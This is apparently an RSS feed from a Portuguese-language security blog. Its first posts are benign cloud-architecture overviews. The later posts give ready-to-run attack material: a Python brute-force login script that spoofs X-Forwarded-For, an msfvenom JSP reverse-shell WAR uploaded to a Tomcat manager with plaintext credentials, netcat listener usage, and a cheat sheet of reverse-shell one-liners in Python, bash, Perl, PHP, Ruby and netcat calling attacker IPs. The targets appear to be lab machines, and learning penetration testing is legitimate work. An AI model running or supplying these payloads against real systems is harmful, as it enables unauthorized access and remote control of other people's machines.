ü§ñ IA na borda: decis√µes em tempo real, manuten√ß√£o preditiva e automa√ß√£o. üîê Seguran√ßa no Edge üåê Superf√≠cie de ataque maior (muitos pontos na borda). üß© Como reagir: Zero Trust, detec√ß√£o de amea√ßas com IA e pol√≠ticas consistentes da borda √† nuvem. Em resumo üîÅ Replica√ß√£o (dados e servi√ßos) = pilar de alta disponibilidade. üß† Edge complementa a nuvem para cen√°rios de baixa lat√™ncia e muito dado (IoT). üöÄ Mercado avan√ßa com IA, 5G e explos√£o de dados; data centers ficam mais eficientes e verdes. üîí Seguran√ßa precisa acompanhar a distribui√ß√£o (Zero Trust &#43; IA). üéØ Objetivo final: sistemas de nuvem robustos, r√°pidos e resilientes, preparados para crescer e responder em tempo real. PRINCIPAIS PROVEDORES DE NUVEM Por que multicloud virou padr√£o üå•Ô∏è Hoje, quase todas as empresas usam mais de um provedor de nuvem. Essa estrat√©gia, chamada multicloud, surgiu para dar mais flexibilidade e reduzir riscos. Em vez de ficar preso a um √∫nico fornecedor, a empresa distribui suas cargas de trabalho em diferentes plataformas, aproveitando o que cada uma tem de melhor.
Os benef√≠cios s√£o claros:
üß© Flexibilidade: escolher servi√ßos espec√≠ficos de cada nuvem. üõ°Ô∏è Resili√™ncia: se um provedor cair, o outro segura as pontas. üí∏ Otimiza√ß√£o de custos: comparar pre√ßos e pagar s√≥ pelo necess√°rio. üîê Seguran√ßa: descentraliza√ß√£o reduz riscos e aumenta conformidade. üö™ Evitar lock-in: liberdade para trocar de estrat√©gia sem ‚Äúamarras‚Äù. ‚ö° Inova√ß√£o: adotar novas tecnologias assim que aparecem no mercado. Mas essa abordagem tamb√©m tem desafios:
üß† Gerenciar ambientes diferentes aumenta a complexidade. üõ°Ô∏è Garantir seguran√ßa uniforme entre provedores √© dif√≠cil. üßæ Custos ocultos (como taxa de sa√≠da de dados) podem surpreender. üë©‚Äçüíª Exige times capacitados em v√°rias plataformas ao mesmo tempo. üëâ A solu√ß√£o √© investir em camadas unificadas de governan√ßa: observabilidade, pol√≠ticas de seguran√ßa e automa√ß√£o que funcionem em todos os provedores.
Vendor Lock-in: o risco de ficar preso üîê O vendor lock-in acontece quando uma empresa depende tanto de um √∫nico fornecedor que mudar se torna caro, demorado ou arriscado. Isso pode reduzir inova√ß√£o e at√© aumentar custos no longo prazo.
Exemplos de riscos: üìâ Servi√ßo piora, mas voc√™ n√£o tem como sair. üí∞ Pre√ßos aumentam e n√£o h√° concorr√™ncia direta. üß± Formatos propriet√°rios dificultam a portabilidade dos dados. üí§ Menos competi√ß√£o ‚Üí menos inova√ß√£o. Como evitar: üß™ Teste antes: fa√ßa prova de conceito antes de adotar servi√ßos cr√≠ticos. üì¶ Portabilidade de dados: use formatos abertos, nunca s√≥ propriet√°rios. üõ°Ô∏è Backups internos: sempre mantenha c√≥pias fora do provedor. üåç Estrat√©gia multicloud ou h√≠brida: combine nuvem p√∫blica &#43; privada para reduzir depend√™ncia. Um bom exemplo √© a Cloudflare, que opera de forma neutra, integrando com qualquer provedor. Isso d√° √†s empresas liberdade para mudar sem travas.
Como escolher provedores üß≠ A escolha entre AWS, Azure, Google Cloud, Oracle e outros depende menos de marketing e mais de objetivos de neg√≥cio.
Crit√©rios importantes:
üß± Portf√≥lio: IaaS, PaaS, SaaS ‚Äî quais servi√ßos voc√™ realmente precisa. üåç Localiza√ß√£o: regi√µes e zonas dispon√≠veis perto do seu p√∫blico. üíµ Custos: n√£o s√≥ pre√ßo de servidor, mas tamb√©m taxa de sa√≠da de dados. üìà SLAs e suporte: garantia de disponibilidade e tempo de resposta. ‚úÖ Conformidade: certifica√ß√µes exigidas pelo seu setor. üõ†Ô∏è Ferramentas de gest√£o: automa√ß√£o, seguran√ßa, monitoramento. No fim, a decis√£o deve ser estrat√©gica: velocidade, custo e controle variam para cada workload. Muitas vezes a resposta n√£o √© escolher um s√≥, mas combinar.
Tend√™ncias que moldam o futuro üöÄ O mercado de nuvem continua crescendo e se transformando. Algumas tend√™ncias j√° se consolidam para os pr√≥ximos anos:
üõ∞Ô∏è Edge &#43; Cloud: processar dados mais perto da fonte (como sensores IoT) para reduzir lat√™ncia. üï∏Ô∏è Supercloud: uma camada que conecta v√°rias nuvens diferentes, tornando-as mais integradas. üîó Nuvem h√≠brida: combina√ß√£o de p√∫blica &#43; privada, unindo desempenho, custo e conformidade. üß™ Computa√ß√£o qu√¢ntica: acesso a algoritmos qu√¢nticos via nuvem, sem precisar de hardware pr√≥prio. ü§ñ IA generativa: integrada √†s plataformas de nuvem para acelerar inova√ß√£o e automa√ß√£o. Conclus√£o ‚ú® A nuvem n√£o √© mais ‚Äúopcional‚Äù: ela se tornou essencial para neg√≥cios modernos.
üå•Ô∏è Multicloud garante flexibilidade e resili√™ncia. üîê Evitar lock-in protege contra depend√™ncia excessiva. üß≠ Escolher o provedor certo √© alinhar tecnologia com objetivos estrat√©gicos. üöÄ Tend√™ncias como Edge, IA e Supercloud mostram que a nuvem n√£o √© s√≥ infraestrutura, mas motor de inova√ß√£o. Em resumo: quem souber orquestrar bem suas escolhas de nuvem ter√° n√£o s√≥ vantagem competitiva, mas tamb√©m maior seguran√ßa, escalabilidade e capacidade de inova√ß√£o.
ELEMENTOS DE ARQUITETURA CLOUD Vis√£o Geral Arquitetar na nuvem √© combinar desempenho, seguran√ßa, disponibilidade, custo e agora tamb√©m sustentabilidade. Abaixo, explico ‚Äî em linguagem simples ‚Äî os elementos que mais impactam a qualidade de um sistema em produ√ß√£o.
Pilares (Well-Architected) &#43; Sustentabilidade ‚ôªÔ∏è A AWS adicionou Sustentabilidade aos pilares cl√°ssicos (Operacional, Seguran√ßa, Confiabilidade, Performance e Custo).
O objetivo √© reduzir o impacto ambiental das cargas na nuvem:
‚ôªÔ∏è Sustentabilidade: usar recursos com efici√™ncia, desligar o que n√£o est√° em uso, optar por regi√µes com menor pegada de carbono e dimensionar corretamente. ‚öôÔ∏è Operacional: processos repet√≠veis, automa√ß√£o e observabilidade. üîê Seguran√ßa: princ√≠pio do menor privil√©gio, criptografia e monitoramento. ü©∫ Confiabilidade: projetar para falhas (redund√¢ncia, failover, testes de DR). üöÄ Performance: lat√™ncia baixa, escolha de servi√ßos certos e escalabilidade. üí∏ Custo: pagar s√≥ pelo que usa, medir e otimizar continuamente. Ignorar esses pilares costuma gerar sistemas caros, inst√°veis e dif√≠ceis de evoluir.
Performance que o usu√°rio sente: Caching &#43; CDN ‚ö° Duas estrat√©gias que reduzem lat√™ncia e aceleram o carregamento:
üß† Caching: guardar respostas/dados temporariamente para evitar buscar ‚Äúna origem‚Äù toda hora. üñ•Ô∏è Navegador: reaproveita HTML/JS/imagens em visitas futuras. üåê DNS: acelera a resolu√ß√£o de nomes. üóÑÔ∏è Aplica√ß√£o/BD: mant√©m dados quentes em mem√≥ria para responder mais r√°pido. üåç CDN (Content Delivery Network): copia seu conte√∫do para servidores de borda pelo mundo. ‚úÖ Cache hit: a CDN j√° tem o arquivo ‚Üí entrega imediata. ‚è¨ Cache miss: busca na origem, guarda e acelera os pr√≥ximos acessos. Resultado pr√°tico: menos dist√¢ncia para os dados viajarem ‚Üí p√°ginas r√°pidas e est√°veis mesmo em escala global.
Escalabilidade e Alta Disponibilidade (HA) üìàüü¢ Voc√™ precisa atender mais usu√°rios sem cair ‚Äî e continuar de p√© quando algo falhar.
Escalabilidade ‚ûï Horizontal (scale-out): adicionar mais inst√¢ncias (ex.: mais pods/VMs).
Vantagem: crescimento quase ilimitado e melhor toler√¢ncia a falhas. Padr√£o na nuvem. ‚¨ÜÔ∏è Vertical (scale-up): deixar uma m√°quina mais potente (mais CPU/RAM).
Vantagem: simples, mas tem limite f√≠sico e pode exigir parada. Alta Disponibilidade (HA) üß© Zonas de Disponibilidade (AZs): data centers separados dentro da mesma regi√£o (energia/rede/refrigera√ß√£o independentes).
Implante em m√∫ltiplas AZs para eliminar ponto √∫nico de falha. üîÅ Redund√¢ncia e failover: tenha r√©plicas e comuta√ß√£o autom√°tica. üß∑ Armazenamento com ZRS: replica dados entre AZs. üè† H√≠brido com baixa lat√™ncia: AWS Outposts leva servi√ßos da nuvem para o seu data center (voc√™ cuida de energia/rede local; a AWS cuida do stack). Mensagem-chave: n√£o basta ‚Äúlevantar e mover‚Äù (lift-and-shift). Re-arquitetar para usar os mecanismos nativos de resili√™ncia da nuvem √© o que traz o ganho real.
Seguran√ßa por design: Menor Privil√©gio &#43; Defesa em Profundidade üîê Seguran√ßa n√£o √© ‚Äúp√≥s-produ√ß√£o‚Äù, √© desde o primeiro desenho (Secure by Design / ‚Äúshift left‚Äù).
üßæ Menor Privil√©gio: cada usu√°rio/sistema recebe s√≥ o acesso m√≠nimo necess√°rio, e pelo tempo necess√°rio. Reduz a superf√≠cie de ataque. üß± Defesa em Profundidade: camadas sobre camadas (firewall, WAF, IAM forte, criptografia em tr√¢nsito/repouso, monitora√ß√£o, detec√ß√£o de intrus√£o). Se uma falhar, a outra segura. ‚ûñ Minimizar superf√≠cie de ataque: exponha apenas o essencial. üìê Padr√µes de desenvolvimento seguro: guias e revis√µes evitam erros repetidos. üßØ Falhar de forma segura: em erros, n√£o vazar dados nem liberar acesso. üö´ Zero Trust (‚Äúnunca confiar, sempre verificar‚Äù): autenticar/autorizar todas as conex√µes. Benef√≠cio pr√°tico: corrigir vulnerabilidades no in√≠cio √© muito mais barato e evita incidentes.
Mini-guia de decis√µes (muito pr√°tico) ‚úÖ Precisa de resposta global r√°pida? ‚Üí CDN &#43; caching. Picos imprevis√≠veis? ‚Üí Auto-scaling horizontal. Sem downtime mesmo com falha de DC? ‚Üí M√∫ltiplas AZs &#43; ZRS &#43; failover. Rodar parte local por lat√™ncia/legado/regula√ß√£o? ‚Üí H√≠brido (ex.: Outposts). Seguran√ßa desde o come√ßo? ‚Üí IAM com menor privil√©gio &#43; Zero Trust &#43; criptografia. Reduzir impacto ambiental? ‚Üí Dimensionar direito, desligar ocioso, escolher regi√µes ‚Äúverdes‚Äù. Tend√™ncias que est√£o puxando a arquitetura ‚òÅÔ∏è üï∏Ô∏è Supercloud: camada comum sobre v√°rias nuvens (multicloud) para reduzir fric√ß√£o. üõ∞Ô∏è Edge &#43; Nuvem: processar na borda quando lat√™ncia √© cr√≠tica, e consolidar/treinar na nuvem. üß™ Qu√¢ntica como servi√ßo: acesso a algoritmos qu√¢nticos via nuvem (sem hardware pr√≥prio). ü§ñ IA Generativa integrada: acelera automa√ß√£o, observabilidade e ganho de produtividade em dev/ops/seguran√ßa. Conclus√£o Projetar bem na nuvem √© equilibrar pilares: desempenho, seguran√ßa, disponibilidade, custo e sustentabilidade.
Com caching &#43; CDN, escala horizontal, HA em m√∫ltiplas AZs e seguran√ßa por design, voc√™ entrega experi√™ncias r√°pidas, est√°veis e seguras, preparadas para crescer ‚Äî e com menor impacto ambiental.
SEGURAN√áA, CUSTOS E BOAS PR√ÅTICAS Vis√£o Geral Para ter ambientes de nuvem realmente prontos para produ√ß√£o, tr√™s frentes precisam caminhar juntas:
üîê Seguran√ßa (proteger dados e acessos), üí∏ Custos (pagar s√≥ pelo que agrega valor), üß≠ Boas pr√°ticas (arquitetura robusta e oper√°vel). Este resumo traduz os conceitos do Well-Architected Framework para quem quer aplicar de forma pr√°tica ‚Äî sem jarg√µes desnecess√°rios.
Well-Architected Framework (AWS) ‚Äî Os 6 Pilares Uma arquitetura ‚Äúbem-arquitetada‚Äù equilibra seis pilares. Pense neles como bot√µes de ajuste: apertar um impacta os outros.
‚öôÔ∏è Excel√™ncia Operacional
Automatize tarefas, crie runbooks e monitore tudo para aprender e melhorar continuamente.
üîê Seguran√ßa
Aplique princ√≠pio do menor privil√©gio, criptografia em tr√¢nsito/repouso e monitora√ß√£o ativa. Seguran√ßa √© processo, n√£o projeto √∫nico.
üß± Confiabilidade
Projete para falhas (redund√¢ncia, failover, testes de DR). O sistema deve funcionar sempre que necess√°rio.
üöÄ Efici√™ncia de Performance
Use o servi√ßo certo para cada trabalho e reavalie com a evolu√ß√£o da demanda/tecnologia.
üí∏ Otimiza√ß√£o de Custos
Entregue o mesmo valor com menos: medi√ß√µes, right-sizing, desligar ocioso e modelos de compra adequados.
‚ôªÔ∏è Sustentabilidade
Reduza impacto ambiental: regi√µes mais ‚Äúverdes‚Äù, dimensionamento correto e uso eficiente de recursos.
üîé Trade-offs existem: mais seguran√ßa pode aumentar custo/complexidade; mais performance pode exigir mais gasto. O jogo √© equil√≠brio consciente.
Seguran√ßa na Pr√°tica (para leigos, sem dor de cabe√ßa) Responsabilidade √© compartilhada: o provedor protege a infra b√°sica; voc√™ protege o que constr√≥i (acessos, dados, configs).
üë§ IAM bem feito (menor privil√©gio): cada pessoa/sistema s√≥ acessa o m√≠nimo necess√°rio e por tempo limitado. üîë Criptografia: em tr√¢nsito (TLS) e em repouso. Chaves gerenciadas e rota√ß√£o peri√≥dica. üåê Rede segura: VPCs, sub-redes, Security Groups, NACLs, WAF, VPN/Direct Connect quando fizer sentido. üßØ Defesa em profundidade: v√°rias camadas (WAF &#43; IAM &#43; criptografia &#43; monitoramento). Se uma falha, a outra segura. üß™ Shift-Left / Secure by Design: revisar seguran√ßa desde o desenho evita remendos caros depois. üëÄ Observabilidade: logs, m√©tricas e alertas para detectar, conter e recuperar r√°pido (pense em runbooks e simula√ß√µes). Custos: FinOps em 7 passos (checklist r√°pido) üìè Medi√ß√£o cont√≠nua (cost explorer, tags obrigat√≥rias por time/produto/ambiente). üß© Right-sizing (CPU/RAM sobrando? ajuste para baixo). ‚è±Ô∏è Desligue ocioso (ambientes de dev/QA fora do hor√°rio). üîÅ Auto-scaling horizontal (paga s√≥ quando cresce). üßæ Modelos de compra: Savings Plans/Reservadas p/ cargas previs√≠veis; Spot p/ tarefas tolerantes a interrup√ß√£o. üóÉÔ∏è Armazenamento inteligente (tiers frios/arquivamento, lifecycle policies). ü§ù FinOps como cultura (metas por time, relat√≥rios simples, melhoria cont√≠nua). Dica: GreenOps complementa o FinOps ‚Äî otimizar custo e pegada de carbono ao mesmo tempo.
Aplica√ß√£o e Trade-offs (como decidir sem travar) Se seguran√ßa √© cr√≠tica regulat√≥ria ‚Üí aceite alguma complexidade/custo extra e invista em automa√ß√£o para compensar. Se o tempo de mercado √© vital ‚Üí privilegie servi√ßos gerenciados e padr√µes prontos (menos controle ‚â† inseguran√ßa se o IAM estiver certo). Se o custo estourou ‚Üí comece por right-sizing, tags e desligamento autom√°tico; s√≥ depois avalie refatora√ß√µes maiores. Tend√™ncias 2025 (o que muda o jogo) üß≠ Detec√ß√£o por contexto: priorizar onde est√° o risco real (menos alertas barulhentos, mais efetividade). üó∫Ô∏è Gr√°ficos de seguran√ßa: mapa vivo do ambiente para conter movimento lateral. üß† IA/ML aplicados √† seguran√ßa e opera√ß√µes: resposta e previs√£o mais r√°pidas. üåê Multi-cloud / H√≠brido: evitar vendor lock-in, atender regula√ß√µes e aumentar resili√™ncia ‚Äî mas com gest√£o unificada. ‚ôªÔ∏è Sustentabilidade como requisito: neutralidade de carbono e efici√™ncia energ√©tica entram no scorecard da arquitetura. Guias de bolso (copie e use) Pol√≠tica m√≠nima de IAM (exemplo simples):
‚úÖ Acesso somente ao recurso necess√°rio ‚úÖ Somente leitura por padr√£o; escreva sob exce√ß√£o ‚úÖ Tempo limitado (chaves/roles tempor√°rias) ‚úÖ MFA para contas sens√≠veis ‚úÖ Review trimestral de permiss√µes Runbook de incidente (esqueleto):
Detectar (alerta) ‚Üí 2. Isolar (SG/WAF) ‚Üí 3. Conten√ß√£o (revogar credenciais/roles) ‚Üí Erradicar (corre√ß√£o/patch) ‚Üí 5. Recuperar (rollback/restore testado) ‚Üí 6. Post-mortem sem culpa. Conclus√£o Seguran√ßa, custos e boas pr√°ticas n√£o competem ‚Äî se complementam. Use os 6 pilares para decidir com consci√™ncia, traga FinOps/GreenOps para o dia a dia e automatize o que for repetitivo.
O resultado √© um ambiente seguro, eficiente e resiliente, que entrega valor r√°pido e de forma sustent√°vel.
]]></content:encoded>
    </item>
    <item>
      <title>Wordlist com Palavras do Site</title>
      <link>https://fxshelll.github.io/posts/wordlist/</link>
      <pubDate>Thu, 23 Jul 2020 02:58:13 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/wordlist/</guid>
      <description>Gerando wordlist com palavras do site cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/
Crie o arquivo brute.py Para executa-lo basta rodar o comando:
$ python3 brute.py
import re import requests def open_ressources(file_path): return [item.replace(&amp;#34;\n&amp;#34;, &amp;#34;&amp;#34;) for item in open(file_path).readlines()] #alvo host = &amp;#39;http://seualvo.com&amp;#39; #url do login login_url = host &#43; &amp;#39;/admin/login&amp;#39; #user username = &amp;#39;admin&amp;#39; #caminho da wordlist wordlist = open_ressources(&amp;#39;/root/wordlists.txt&amp;#39;) for password in wordlist: session = requests.Session() login_page = session.</description>
      <content:encoded><![CDATA[Gerando wordlist com palavras do site cewl -w wordlists.txt -d 10 -m 1 http://seualvo.com/
Crie o arquivo brute.py Para executa-lo basta rodar o comando:
$ python3 brute.py
import re import requests def open_ressources(file_path): return [item.replace(&amp;#34;\n&amp;#34;, &amp;#34;&amp;#34;) for item in open(file_path).readlines()] #alvo host = &amp;#39;http://seualvo.com&amp;#39; #url do login login_url = host &#43; &amp;#39;/admin/login&amp;#39; #user username = &amp;#39;admin&amp;#39; #caminho da wordlist wordlist = open_ressources(&amp;#39;/root/wordlists.txt&amp;#39;) for password in wordlist: session = requests.Session() login_page = session.get(login_url) csrf_token = re.search(&amp;#39;input.&#43;?name=&amp;#34;tokenCSRF&amp;#34;.&#43;?value=&amp;#34;(.&#43;?)&amp;#34;&amp;#39;, login_page.text).group(1) print(&amp;#39;[*] Trying: {p}&amp;#39;.format(p = password)) headers = { &amp;#39;X-Forwarded-For&amp;#39;: password, &amp;#39;User-Agent&amp;#39;: &amp;#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&amp;#39;, &amp;#39;Referer&amp;#39;: login_url } data = { &amp;#39;tokenCSRF&amp;#39;: csrf_token, &amp;#39;username&amp;#39;: username, &amp;#39;password&amp;#39;: password, &amp;#39;save&amp;#39;: &amp;#39;&amp;#39; } login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False) if &amp;#39;location&amp;#39; in login_result.headers: if &amp;#39;/admin/dashboard&amp;#39; in login_result.headers[&amp;#39;location&amp;#39;]: print() print(&amp;#39;SUCCESS: Password found!&amp;#39;) print(&amp;#39;Use {u}:{p} to login.&amp;#39;.format(u = username, p = password)) print() break ]]></content:encoded>
    </item>
    <item>
      <title>Dirsearch</title>
      <link>https://fxshelll.github.io/posts/dirsearch/</link>
      <pubDate>Thu, 23 Jul 2020 02:37:57 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/dirsearch/</guid>
      <description>DIRSEARCH ================ https://github.com/maurosoria/dirsearch
O dirsearch √© uma ferramenta simples de linha de comando projetada para diret√≥rios e arquivos de for√ßa bruta em sites.
Particularmente prefiro ele ao inv√©s do DIRB ou GoBuster, j√° obtive mais resultados com ele, por√©m depois vou escrever sobre essas outras duas ferramentas aqui tamb√©m.
Uso git clone https://github.com/maurosoria/dirsearch.git
$ cd dirsearch
python3 dirsearch.py -u &amp;lt;URL&amp;gt; -e &amp;lt;EXTENSION&amp;gt;
Exemplo $ python3 dirsearch.py -u http://sitedoalvo.com.br(ou IP) -e *</description>
      <content:encoded><![CDATA[DIRSEARCH ================ https://github.com/maurosoria/dirsearch
O dirsearch √© uma ferramenta simples de linha de comando projetada para diret√≥rios e arquivos de for√ßa bruta em sites.
Particularmente prefiro ele ao inv√©s do DIRB ou GoBuster, j√° obtive mais resultados com ele, por√©m depois vou escrever sobre essas outras duas ferramentas aqui tamb√©m.
Uso git clone https://github.com/maurosoria/dirsearch.git
$ cd dirsearch
python3 dirsearch.py -u &amp;lt;URL&amp;gt; -e &amp;lt;EXTENSION&amp;gt;
Exemplo $ python3 dirsearch.py -u http://sitedoalvo.com.br(ou IP) -e *
_|. _ _ _ _ _ _|_ v0.3.9 (_||| _) (/_(_|| (_| ) Extensions: | HTTP method: getSuffixes: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6552 | Request count: 6552 Error Log: /root/dirsearch/logs/errors-20-06-29_23-59-23.log Target: http://10.10.10.185 Output File: /root/dirsearch/reports/10.10.10.185/20-06-29_23-59-24 [23:59:24] Starting: [00:00:12] 301 - 313B - /images -&amp;gt; http://10.10.10.185/images/ [00:00:14] 403 - 277B - /index.shtml [00:00:14] 200 - 67KB - /index.php [00:00:14] 200 - 67KB - /index.php/login/ [00:00:14] 403 - 277B - /install.sql [00:00:17] 403 - 277B - /localhost.sql [00:00:17] 403 - 277B - /log.sqlite [00:00:18] 200 - 4KB - /login.php [00:00:18] 403 - 277B - /login.shtml [00:00:19] 403 - 277B - /logs.sqlite O dirsearch vai encontrar pastas e urls uteis para a explora√ß√£o de vulnerabilidades.
]]></content:encoded>
    </item>
    <item>
      <title>sh_MSFvenom</title>
      <link>https://fxshelll.github.io/posts/sh_msfvenom/</link>
      <pubDate>Thu, 23 Jul 2020 02:25:57 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/sh_msfvenom/</guid>
      <description>echo &amp;#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&amp;#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &amp;gt; exploit.war #IP do seu local host &#43; porta #Cria√ß√£o do arquivo .WAR echo &amp;#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&amp;#34; curl --user &amp;#39;tomcat:$3cureP4s5w0rd123!&amp;#39; --upload-file exploit.war &amp;#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&amp;#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) &#43; porta da aplica√ß√£o #upload do arquivo .war echo &amp;#34;------------------------------------sucesso no upload -----------------------------------------------------&amp;#34; echo &amp;#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&amp;#34; echo &amp;#34;----------------------------------- http://10.</description>
      <content:encoded><![CDATA[echo &amp;#34;-------------------------------------CRIANDO UM EXPLOID COM MSFVENOM----------------------------------------------------&amp;#34; msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.29 LPORT=4444 -f war &amp;gt; exploit.war #IP do seu local host &#43; porta #Cria√ß√£o do arquivo .WAR echo &amp;#34;-------------------------------------UPLOAD DO EXPLOIT NO ALVO---------------------------------------------------------&amp;#34; curl --user &amp;#39;tomcat:$3cureP4s5w0rd123!&amp;#39; --upload-file exploit.war &amp;#34;http://10.10.10.194:8080/manager/text/deploy?path=/exploit.war&amp;#34; #O ataque foi em um alvo cujo tomcat9 estava vulneravel #IP do RHOST(alvo) &#43; porta da aplica√ß√£o #upload do arquivo .war echo &amp;#34;------------------------------------sucesso no upload -----------------------------------------------------&amp;#34; echo &amp;#34;-----------------------------------Se conectando ao netcat---------------------------------------------------------&amp;#34; echo &amp;#34;----------------------------------- http://10.10.10.194:8080/exploit.war ---------------------------------------------&amp;#34; nc -nvlp 4444 #em outra aba do terminal, deixe escutando na porta que desejar # nc -nvlp 4444 Quando estiver ouvindo a porta, v√° no navegador e chame o arquivo que voc√™ acabou de fazer o upload
http://10.10.10.194:8080/exploit.war/
volte no terminal, ele vai ter conectado via shell agora execute o shell reverso em python para o term
listening on [any] 4444 &amp;hellip; connect to [10.10.14.29] from (UNKNOWN) [10.10.10.194] 50476
$ python3 -c &amp;quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&amp;quot;
]]></content:encoded>
    </item>
    <item>
      <title>The_silver_searcher</title>
      <link>https://fxshelll.github.io/posts/the_silver_searcher/</link>
      <pubDate>Thu, 23 Jul 2020 02:17:35 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/the_silver_searcher/</guid>
      <description>AG ====== https://github.com/ggreer/the_silver_searcher
Uma ferramenta de busca de c√≥digo semelhante a ack, com foco na velocidade, faz uma busca recursiva em diret√≥rios e arquivos.
apt-get install silversearcher-ag</description>
      <content:encoded><![CDATA[AG ====== https://github.com/ggreer/the_silver_searcher
Uma ferramenta de busca de c√≥digo semelhante a ack, com foco na velocidade, faz uma busca recursiva em diret√≥rios e arquivos.
apt-get install silversearcher-ag
]]></content:encoded>
    </item>
    <item>
      <title>Netcat</title>
      <link>https://fxshelll.github.io/posts/netcat/</link>
      <pubDate>Thu, 23 Jul 2020 02:02:18 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/netcat/</guid>
      <description>Netcat ================
O Netcat √© um utilit√°rio que l√™ e grava dados nas conex√µes de rede, usando o protocolo TCP ou UDP. Ele foi projetado para ser uma ferramenta confi√°vel de &amp;ldquo;back-end&amp;rdquo; que pode ser usada diretamente ou direcionada por outros programas e scripts. Ao mesmo tempo, √© uma ferramenta de depura√ß√£o e explora√ß√£o de rede rica em recursos, pois pode criar quase qualquer tipo de conex√£o que voc√™ precisa e possui v√°rios recursos internos interessantes.</description>
      <content:encoded><![CDATA[Netcat ================
O Netcat √© um utilit√°rio que l√™ e grava dados nas conex√µes de rede, usando o protocolo TCP ou UDP. Ele foi projetado para ser uma ferramenta confi√°vel de &amp;ldquo;back-end&amp;rdquo; que pode ser usada diretamente ou direcionada por outros programas e scripts. Ao mesmo tempo, √© uma ferramenta de depura√ß√£o e explora√ß√£o de rede rica em recursos, pois pode criar quase qualquer tipo de conex√£o que voc√™ precisa e possui v√°rios recursos internos interessantes. Os usos comuns incluem:
&#43; Proxies TCP simples &#43; Clientes e servidores HTTP baseados em shell-script &#43; Teste de daemon de rede &#43; A Socks ou HTTP ProxyCommand para ssh Sintaxe:
$ nc -nlvp 1234
-n N√£o fa√ßa pesquisas de servi√ßo ou DNS em endere√ßos, nomes de host ou portas especificados.
-l Usado para especificar que o nc deve escutar uma conex√£o de entrada em vez de iniciar uma conex√£o com um host remoto. √â um erro usar esta op√ß√£o em conjunto com as op√ß√µes -p, -s ou -z. Al√©m disso, qualquer tempo limite especificado com a op√ß√£o -w √© ignorado.
-v Fa√ßa nc dar uma sa√≠da mais detalhada.
-p source_port Especifica a porta de origem que a nc deve usar, sujeita a restri√ß√µes e disponibilidade de privil√©gios.
Ou seja, com ele podemos ouvir a porta TCP/UDP podemos colocar o nc escutando na porta 1234 uma conex√£o, para usar um shell reverso por exemplo.
]]></content:encoded>
    </item>
    <item>
      <title>Reverse Shell</title>
      <link>https://fxshelll.github.io/posts/dicasdereverseshell/</link>
      <pubDate>Thu, 23 Jul 2020 01:51:31 UT</pubDate>
      <dc:creator>Felipe da Matta</dc:creator>
      <guid>https://fxshelll.github.io/posts/dicasdereverseshell/</guid>
      <description>Python =====================
python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; python3 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.15&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; Bash =====================
bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.19.68/4455 0&amp;gt;&amp;amp;1 PERL =====================
perl -e &amp;#39;use Socket;$i=&amp;#34;10.0.0.1&amp;#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39; PHP =====================
php -r &amp;#39;$sock=fsockopen(&amp;#34;10.0.0.1&amp;#34;,1234);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39; Ruby =====================
ruby -rsocket -e&amp;#39;f=TCPSocket.open(&amp;#34;10.0.0.1&amp;#34;,1234).to_i;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,f,f,f)&amp;#39; Netcat =====================
nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f Java =====================
r = Runtime.getRuntime() p = r.exec([&amp;#34;/bin/bash&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;exec 5&amp;lt;&amp;gt;/dev/tcp/10.</description>
      <content:encoded><![CDATA[Python =====================
python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; python3 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.10.14.15&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; Bash =====================
